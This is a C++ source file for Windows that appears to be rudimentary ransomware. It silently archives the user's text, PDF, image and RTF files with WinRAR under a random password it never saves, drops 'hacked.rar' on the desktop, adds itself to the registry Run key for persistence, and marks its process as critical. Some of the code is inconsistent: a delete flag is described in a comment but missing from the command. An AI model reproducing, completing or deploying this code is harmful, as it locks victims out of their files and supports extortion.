#include <iostream>
#include <stdlib.h>     /* srand, rand */
#include <time.h>       /* time */
#include <string>
#include <Windows.h>
#include <sstream>		/* char to string */ 
#include <sys/stat.h>   /* for check if file exists */
#include "protector.h"
using namespace std;

bool fileExists(const std::string& filename);
std::string generateKey();

int main(){
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	std::string password = generateKey();
	TCHAR filePath[MAX_PATH];
	TCHAR tempPath[MAX_PATH];
	GetModuleFileNameA(NULL,filePath, MAX_PATH);	// get current file path
	GetTempPathA(MAX_PATH, tempPath);	// get temp path
	//Get username
	char user[MAX_PATH+1];
	DWORD user_len = MAX_PATH+1;
	GetUserName(user, &user_len);	 //get user name
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	//config
	std::string extensionList = "\"C:\\Users\\*\\*.txt\" \"C:\\Users\\*\\*.pdf\" \"C:\\Users\\*\\*.jpg\" \"C:\\Users\\*\\*.jpeg\" \"C:\\Users\\*\\*.rtf\"";
	std::string desktopPath = "C:\\Users\\" + (std::string)(user) + "\\Desktop\\";
	const std::string rarPath = "C:\\Program Files\\WinRAR\\WinRAR.exe";
	const std::string fileName = "hacked.rar";

	std::string tempName = tempPath + fileName;

	std::string desktopName = desktopPath + fileName;
	/*
	-ioff	turn off computer after finish
	-mt2	use two threads
	-inul	no debug message
	-IBCK	run silently
	-df		delete file after finish
	*/
	std::string fullCommandRar = "\"" +(std::string)rarPath + "\"" +"-mt2 a -IBCK -ace -p=" + password + " -m1 -logf=\"" + desktopPath + "list_crypted_file.txt\" \"" + (std::string)tempPath + fileName + "\" " + extensionList;
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	//put filePath to double quotes  - fullResult
	TCHAR fullResult[MAX_PATH];
	fullResult[0] = NULL;
	TCHAR fullFilePath[MAX_PATH] = "\"";
	strcat_s(fullResult, fullFilePath);
	strcat_s(fullResult, filePath);
	strcat_s(fullResult, "\"");
	//write itself to start-up by registry key 
	//std::cout << fullResult << std::endl; //debug
	HKEY hkey;
	long regOpenResult;
	regOpenResult = RegOpenKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	long reg = RegSetValueEx(hkey,"Success",0,REG_SZ,(BYTE*) fullResult, strlen(fullResult));
	RegCloseKey(hkey);
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	//check if rar exist or not
	if(fileExists(rarPath)){ 
		if(fileExists(tempName) || fileExists(desktopName)){
			MoveFile(tempName.c_str(), desktopName.c_str()); // move archived file to desktop
			ProtectProcess();  //make process as critical . example : winlogon.exe 
			while(true){}; //for futher develope
		}
		else{
		//std::cout << "Exist" << std::endl;
		WinExec(fullCommandRar.c_str(), 1);
		Sleep(9999999); //sleep till restart
		}
	}
	else{
		//std::cout << "Not Exist" << std::endl;
	}
		//std::system("pause");
	return 0;
}



//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bool fileExists(const std::string& filename)
{
	struct stat buf;
	if (stat(filename.c_str(), &buf) != -1)
	{
		return true;
	}
	return false;
}

std::string generateKey(){
	srand (time(NULL));
	int asciiNum, randomNum;
	std::string secretKey, randomNumStr, randomNumStreamStr, asciiNumStr;
	for(int i = 0; i < 16; i++){
		asciiNum = rand()%25 + 97;	// ascii character : 97 -122
		randomNum = rand()%10 + 1;
		std::stringstream ss;
		ss << (char)(asciiNum);
		ss >> asciiNumStr;
		randomNumStr = std::to_string((long double)randomNum);
		secretKey += (randomNumStr + asciiNumStr);
	}
	return secretKey;
}